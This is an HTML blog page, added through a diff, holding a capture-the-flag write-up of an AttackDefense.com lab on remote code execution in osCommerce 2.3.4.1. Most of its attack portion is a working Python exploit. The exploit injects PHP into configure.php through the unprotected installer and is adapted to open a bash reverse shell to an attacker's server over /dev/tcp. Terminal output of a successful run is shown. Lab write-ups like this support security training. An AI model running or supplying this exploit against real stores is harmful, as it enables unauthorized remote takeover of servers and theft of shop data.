@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.css" />
+<script async defer src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.0.2/cookieconsent.min.js"></script>
+<script>
+window.addEventListener("load", function(){
+window.cookieconsent.initialise({
+  "palette": {
+    "popup": {
+      "background": "#424242"
+    },
+    "button": {
+      "background": "#2a7ae2"
+    }
+  },
+  "content": {
+    "href": "/privacy-policy"
+  }
+})});
+</script>
+  
+  
+  
+  <title>AttackDefense.com [RCE] - osCommerce</title>
+  <meta name="description" content="">
+  
+    
+    <meta name="keywords" content="Lucian Nitescu DCTF DefCamp 2018 competition CTF capture flag chall challange">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="https://nitesculucian.github.io/2018/10/26/attackdefense-com-rce-oscommerce/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="Lucian Nitescu" href="https://nitesculucian.github.io/feed.xml">
+  <meta name="flattr:id" content="njnwdo">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:title" content="AttackDefense.com [RCE] - osCommerce">
+  <meta name="twitter:description" content="">
+  
+  
+
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css?family=Bitter:400,400i,700" rel="stylesheet">
+
+  
+  <!-- Google Analytics -->
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-107695141-1', 'auto');
+    ga('send', 'pageview');
+
+  </script>
+
+
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Lucian Nitescu</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/">Home</a>
+      
+        
+        <a class="page-link" href="/about/">Whoami</a>
+      
+        
+        <a class="page-link" href="/archives/">Archives</a>
+      
+    </nav>
+    <br>Security Blog
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    
+      <h1 class="post-title" itemprop="name headline">AttackDefense.com [RCE] - osCommerce</h1>
+    
+    <p class="post-meta"><time datetime="2018-10-26T13:57:00-03:00" itemprop="datePublished">Oct 26, 2018</time> •
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/attackdefense-com/">AttackDefense.com</a>,
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/ctf/">ctf</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/writeups/">writeups</a>,
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  
+    
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a href="/categories/rce/">rce</a>
+      
+    
+  
+
+
+
+</p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p><img src="/uploads/Screenshot from 2018-10-26 17-44-27.png" alt="Image of AttackDefense 2018" /></p>
+
+<h3 id="mission">Mission</h3>
+
+<p>A version of osCommerce is vulnerable to a remote code execution attack. Exploiting this flaw does not require any valid accounts on the system. A attacker can remotely exploit the system and run arbitrary commands on the system as the web server user.</p>
+
+<p>Your task is to find this vulnerability and gain remote code exploitation!</p>
+
+<p>Level difficulty: Intermediate</p>
+
+<p>Category: Real World Webapps &gt; Remote Code Execution</p>
+
+<h3 id="solution">Solution</h3>
+
+<p>Also, on this challenge, I got a real copy of a<code class="highlighter-rouge">osCommerce</code> application deploy, an online shop.</p>
+
+<p><img src="/uploads/adrce3/image1.png" alt="Image of AttackDefense 2018" /></p>
+
+<p>From the previous challenge (AttackDefense.com [RCE] - ApPHP MicroBlog) I got the simplest idea of testing for installation files and folders in order to gain more information about the target.</p>
+
+<p>By accessing <a href="http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/">http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/</a> I obtain the following:</p>
+
+<p><img src="/uploads/adrce3/image8.png" alt="Image of AttackDefense 2018" /></p>
+
+<p>Knowing the version of the application I decided to search for a publicly available exploit. I found an interesting one at this <a href="https://www.exploit-db.com/exploits/44374/">link</a>.</p>
+
+<p><img src="/uploads/adrce3/image10.png" alt="Image of AttackDefense 2018" /></p>
+
+<p>After taking a look at the exploit code I decided to adapt it to my needs:</p>
+
+<p><img src="/uploads/adrce3/image2.png" alt="Image of AttackDefense 2018" /></p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lucian@local:~/Downloads$</span> python 44374.py 
+<span class="go">[+] Successfully launched the exploit. Open the following URL to execute your code
+
+http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/includes/configure.php
+</span><span class="gp">lucian@local:~/Downloads$</span> 
+</code></pre></div></div>
+
+<p><img src="/uploads/adrce3/image5.png" alt="Image of AttackDefense 2018" /></p>
+
+<p>At this point, we got a remote code execution using a PHP Object Injection vector of attack.</p>
+
+<p>In order to obtain a reverse shell for this exploit you have to make a few changes to the exploit script.</p>
+
+<p><img src="/uploads/adrce3/image4.png" alt="Image of AttackDefense 2018" /></p>
+
+<p>The exploit code will like that:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="c"># Exploit Title: osCommerce 2.3.4.1 Remote Code Execution</span>
+<span class="c"># Date: 29.0.3.2018</span>
+<span class="c"># Exploit Author: Simon Scannell - https://scannell-infosec.net &lt;contact@scannell-infosec.net&gt;</span>
+<span class="c"># Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable</span>
+<span class="c"># Tested on: Linux, Windows</span>
+
+<span class="c"># If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible</span>
+<span class="c"># for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page</span>
+<span class="c"># is already installed and does not attempt to do any authentication. It is possible for an attacker to directly</span>
+<span class="c"># execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject</span>
+<span class="c"># PHP code into the config file and then simply executing the code by opening it.</span>
+
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="c"># enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)</span>
+<span class="n">base_url</span> <span class="o">=</span> <span class="s">"http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/"</span>
+<span class="n">target_url</span> <span class="o">=</span> <span class="s">"http://cmngb11ivpcr7if1cc227nrzp.public1.attackdefenselabs.com/install/install.php?step=4"</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'DIR_FS_DOCUMENT_ROOT'</span><span class="p">:</span> <span class="s">'./'</span>
+<span class="p">}</span>
+
+<span class="c"># the payload will be injected into the configuration file via this code</span>
+<span class="c"># '  define(\'DB_DATABASE\', \'' . trim($HTTP_POST_VARS['DB_DATABASE']) . '\');' . "\n" .</span>
+<span class="c"># so the format for the exploit will be: '); PAYLOAD; /*</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\'</span><span class="s">);'</span>
+<span class="c"># payload += 'system("ls");'    # this is where you enter you PHP payload</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'system("bash -i &gt;&amp; /dev/tcp/&lt;Your VPS IP Address&gt;/1337 0&gt;&amp;1");'</span>    <span class="c"># this is where you enter you PHP payload</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">'/*'</span>
+
+<span class="n">data</span><span class="p">[</span><span class="s">'DB_DATABASE'</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
+
+<span class="c"># exploit it</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Successfully launched the exploit. Open the following URL to execute your code</span><span class="se">\n\n</span><span class="s">"</span> <span class="o">+</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s">"install/includes/configure.php"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[-] Exploit did not execute as planned"</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p><img src="/uploads/adrce3/image6.png" alt="Image of AttackDefense 2018" /></p>
+
+  </div>
+
+  
+    <div class="post-comments" itemprop="comment">
+      <hr />
+<h1>Comments</h1>
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://nitesculucian.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+    </div>
+  
+
+</article>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Lucian Nitescu - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://nitesculucian.github.io/feed.xml">RSS</a>
+
+      | <a href="/privacy-policy" >Privacy Policy</a>
+      | <a href="/legal-disclaimer" >Legal Disclaimer</a>
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
